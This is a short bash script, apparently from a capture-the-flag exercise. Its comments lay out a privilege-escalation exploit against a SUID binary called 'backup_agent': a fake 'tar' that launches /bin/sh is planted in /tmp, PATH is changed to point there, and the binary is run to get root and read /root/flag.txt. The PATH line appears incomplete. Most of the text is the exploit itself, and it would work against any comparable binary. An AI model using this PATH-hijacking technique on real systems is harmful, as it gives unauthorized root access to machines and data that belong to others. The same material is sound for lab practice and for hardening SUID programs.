#!/bin/bash
# Privilege Escalation: Vulnerable SUID Binary '/usr/local/bin/backup_agent'
# Vector: Relative PATH hijacking on 'tar' binary call
echo 'Running backup...'
# Exploit:
# echo '/bin/sh' > /tmp/tar && chmod +x /tmp/tar
# export PATH=/tmp:
# /usr/local/bin/backup_agent
# Exploit the binary to obtain root access and extract /root/flag.txt
